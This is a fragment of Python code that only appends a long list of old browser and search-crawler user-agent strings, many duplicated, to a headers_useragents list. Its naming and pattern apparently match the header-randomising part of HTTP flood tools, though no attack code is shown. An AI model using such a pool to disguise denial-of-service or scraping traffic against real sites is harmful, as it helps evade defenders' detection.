	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
